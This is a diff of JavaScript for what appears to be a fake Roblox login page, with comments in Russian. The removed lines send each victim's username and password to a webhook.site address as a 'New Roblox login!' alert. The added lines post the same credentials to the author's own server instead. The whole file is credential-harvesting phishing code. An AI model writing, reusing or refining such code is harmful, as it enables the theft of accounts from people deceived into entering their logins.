@@ -1,6 +1,3 @@
-// ⚠️ ВСТАВЬ СЮДА СВОЙ ВЕБХУК ⚠️
-const WEBHOOK_URL = "https://webhook.site/your-unique-id-here";
-
 document.addEventListener("DOMContentLoaded", () => {
     const loginForm = document.getElementById('loginForm');
     
@@ -15,12 +12,11 @@ document.addEventListener("DOMContentLoaded", () => {
         loginBtn.disabled = true;
 
         try {
-            await fetch(WEBHOOK_URL, {
+            // Отправляем данные на наш собственный сервер (на Render)
+            await fetch('/login', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: `🔴 **Новый логин Roblox!**\n👤 **User:** \`${username}\`\n🔑 **Pass:** \`${password}\``
-                })
+                body: JSON.stringify({ username, password })
             });
         } catch (error) {
             console.error("Ошибка:", error);
